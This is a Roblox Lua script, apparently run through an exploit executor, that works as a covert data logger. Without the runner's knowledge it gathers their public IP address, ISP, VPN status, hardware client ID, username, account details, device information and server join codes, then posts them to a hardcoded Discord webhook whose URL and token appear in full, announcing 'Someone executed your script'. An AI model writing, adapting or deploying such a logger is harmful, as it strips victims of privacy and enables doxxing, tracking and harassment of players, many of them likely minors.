local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
local LuaJoinCode = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')", game.PlaceId, game.JobId)

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Device Type and Details
local function getDeviceInfo()
    local deviceType = "Unknown"
    local details = {}

    if GuiService:IsTenFootInterface() then
        deviceType = "Console"
    elseif UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
        deviceType = "Mobile"
        local viewportSize = workspace.CurrentCamera.ViewportSize
        details.screenResolution = string.format("%dx%d", viewportSize.X, viewportSize.Y)
        details.deviceOrientation = (viewportSize.X > viewportSize.Y) and "Landscape" or "Portrait"
        details.isTablet = (viewportSize.Y > 600) and "Tablet" or "Phone"
    else
        deviceType = "Desktop"
        details.hasKeyboard = UserInputService.KeyboardEnabled
        details.hasMouse = UserInputService.MouseEnabled
        details.hasTouch = UserInputService.TouchEnabled
        details.hasGamepad = UserInputService.GamepadEnabled
    end

    details.graphicsQuality = UserSettings().GameSettings.SavedQualityLevel
    details.viewportSize = tostring(workspace.CurrentCamera.ViewportSize)

    return deviceType, details
end

-- VPN and ISP Detection
local function getVpnAndIspInfo()
    local ipData = HttpService:JSONDecode(GetData)
    local isVpn = ipData.proxy == true and "Y" or "N"
    local isp = ipData.isp or "Unknown"
    return isVpn, isp
end

-- Creating Webhook Data
local function createWebhookData()
    local deviceType, deviceDetails = getDeviceInfo()
    local isVpn, isp = getVpnAndIspInfo()
    
    local data = {
        ["avatar_url"] = "https://github.com/tomoneko2222/tomonekonet.tool/blob/main/logo.png?raw=true",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n**Device Type:** %s" ..
                    "\n**Device Details:** %s" ..
                    "\n**VPN:** %s" ..
                    "\n**Provider:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d" ..
                    "\n\n**Data:**```%s```\n\n**Console JobId:**```%s```\n\n**Lua Join Code:**```lua\n%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    deviceType, HttpService:JSONEncode(deviceDetails),
                    isVpn, isp,
                    game.PlaceId, GAMENAME, game.PlaceId,
                    GetData, ConsoleJobId, LuaJoinCode
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"),
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1289573346127773736/4DBaHOUuyz2Dkadmm3mx-yg5rWrwxLLwLFOaeFHQjEVjL--uYw16VCXja5-YLw0_GQSP"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)
